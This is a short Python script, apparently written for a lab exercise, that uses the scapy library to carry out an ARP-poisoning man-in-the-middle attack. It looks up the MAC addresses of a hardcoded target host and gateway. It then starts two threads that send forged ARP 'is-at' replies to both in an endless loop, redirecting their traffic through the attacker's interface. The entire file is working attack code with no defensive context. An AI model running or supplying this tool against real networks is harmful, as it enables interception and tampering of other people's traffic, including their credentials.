#! /usr/bin/python3
import threading

from scapy.arch import get_if_addr
from scapy.arch import get_if_hwaddr
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP
from scapy.sendrecv import sendp
from scapy.sendrecv import srp

IFACE = 'ens5'

MY_MAC = get_if_hwaddr(IFACE)  # NOTE recupere mon MAC de l'interface
MY_IP = get_if_addr(IFACE)

GATEWAY = '192.168.0.1'
TARGET = '192.168.0.2'


def get_mac(target: str) -> str:
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target)

    resp, _ = srp(pkt, verbose=False, iface=IFACE)
    for _, r in resp:
        return r.hwsrc


def poising_target(hw_target: str)-> None:
    pkt = Ether(dst=hw_target) / ARP(pdst=TARGET, hwdst=hw_target,
                                     hwsrc=MY_MAC, psrc=GATEWAY,
                                     op='is-at')
    sendp(pkt, verbose=0, iface=IFACE, loop=1)


def poising_gateway(hw_gateway: str)-> None:
    pkt = Ether(dst=hw_gateway) / ARP(pdst=GATEWAY, hwdst=hw_gateway,
                                    psrc=TARGET, hwsrc=MY_MAC,
                                    op='is-at')
    
    sendp(pkt, verbose=0, loop=1, iface=IFACE)


mac_target = get_mac(TARGET)
mac_gateway = get_mac(GATEWAY)

threading.Thread(target=poising_target, args=(mac_target, )).start()
threading.Thread(target=poising_gateway, args=(mac_gateway, )).start()
